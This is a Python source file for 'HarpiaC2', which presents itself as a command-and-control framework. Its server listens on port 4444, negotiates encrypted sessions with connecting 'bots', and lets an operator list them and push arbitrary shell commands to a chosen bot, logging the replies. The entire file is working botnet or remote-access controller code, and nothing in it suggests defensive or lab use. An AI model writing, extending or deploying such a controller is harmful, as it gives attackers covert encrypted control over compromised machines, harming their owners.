import socket
import threading
import os
from colorama import Fore, Style, init
from utils import aes_crypto, key_exchange
from utils.helpers import print_ascii_art, log_command

init(autoreset=True)

TOOL_NAME = "HarpiaC2"

HOST = '0.0.0.0'
PORT = 4444

connected_bots = []
bot_id_counter = 0
lock = threading.Lock()

def handle_bot(client_socket, addr, bot_id):
    try:
        # === Handshake Diffie-Hellman ===
        server_private_key = key_exchange.generate_private_key()
        server_public_bytes = key_exchange.get_public_bytes(server_private_key)
        client_socket.send(server_public_bytes)

        try:
            bot_public_bytes = client_socket.recv(4096)
            bot_public_key = key_exchange.load_peer_public_bytes(bot_public_bytes)
            session_key = key_exchange.generate_shared_key(server_private_key, bot_public_key)
        except Exception as e:
            print(Fore.RED + f"[!] Failed DH handshake with {addr}: {e}")
            client_socket.close()
            return

        bot_info = aes_crypto.decrypt(client_socket.recv(1024), session_key).decode()

        with lock:
            connected_bots.append({
                'id': bot_id,
                'addr': addr,
                'info': bot_info,
                'socket': client_socket,
                'key': session_key
            })

        print(Fore.YELLOW + f"\n[+] New bot connected: ID {bot_id}")
        print(Fore.CYAN + bot_info)
        print(Fore.LIGHTBLACK_EX + f"[+] From {addr[0]}:{addr[1]}\n")

    except Exception as e:
        print(Fore.RED + f"[!] Error with bot {addr}: {e}")
        client_socket.close()

def control_bot(bot):
    print(Fore.LIGHTBLUE_EX + f"\n[*] Connected to bot {bot['id']}. Type 'back' to return.\n")

    while True:
        cmd = input(f"[bot-{bot['id']}] > ").strip()

        if cmd.lower() in ["cls", "clear"]:
            os.system("cls" if os.name == "nt" else "clear")
            continue

        if cmd.lower() == "back":
            break

        try:
            bot['socket'].send(aes_crypto.encrypt(cmd, bot['key']))
            response = aes_crypto.decrypt(bot['socket'].recv(4096), bot['key'])

            if not response:
                raise Exception("Bot disconnected")

            print(Fore.YELLOW + response)
            log_command(bot['id'], cmd, response)

        except Exception as e:
            print(Fore.RED + f"[!] Bot {bot['id']} disconnected or failed: {e}")
            with lock:
                connected_bots[:] = [b for b in connected_bots if b['id'] != bot['id']]
            break

def operator_menu():
    print_ascii_art()
    print(Fore.YELLOW + f"\nWelcome to {TOOL_NAME} - Brazilian Command & Control Framework\n")
    print(Fore.MAGENTA + "Type 'help' to see available commands.\n")

    while True:
        cmd_input = input(Fore.YELLOW + f"[{TOOL_NAME}] > " + Style.RESET_ALL).strip()

        if cmd_input.lower() in ["cls", "clear"]:
            os.system("cls" if os.name == "nt" else "clear")
            continue

        if cmd_input == "list":
            print(Fore.CYAN + "\n[*] Connected Bots:")
            if not connected_bots:
                print(Fore.RED + "  No bots connected.")
            for bot in connected_bots:
                print(f"  ID {bot['id']} - {bot['addr'][0]}:{bot['addr'][1]}")
        elif cmd_input.startswith("use "):
            try:
                target_id = int(cmd_input.split(" ")[1])
                bot = next(b for b in connected_bots if b['id'] == target_id)
                control_bot(bot)
            except (IndexError, StopIteration, ValueError):
                print(Fore.RED + "[!] Invalid bot ID.")
        elif cmd_input == "exit":
            print(Fore.YELLOW + f"[*] Exiting {TOOL_NAME}...")
            break
        elif cmd_input == "help":
            print(Fore.LIGHTBLUE_EX + "\nAvailable Commands:")
            print("  list            - Show all connected bots")
            print("  use <id>        - Interact with a specific bot")
            print("  help            - Show this help menu")
            print("  cls / clear     - Clear the screen")
            print("  exit            - Exit the C2 framework\n")
        else:
            print(Fore.RED + "[!] Unknown command. Type 'help' for a list.")

def start_server():
    global bot_id_counter
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(10)
    print(Fore.GREEN + f"[+] Listening for bots on {HOST}:{PORT}...\n")

    while True:
        client_socket, addr = server.accept()
        thread = threading.Thread(target=handle_bot, args=(client_socket, addr, bot_id_counter))
        thread.start()
        bot_id_counter += 1

if __name__ == "__main__":
    threading.Thread(target=start_server, daemon=True).start()
    operator_menu()
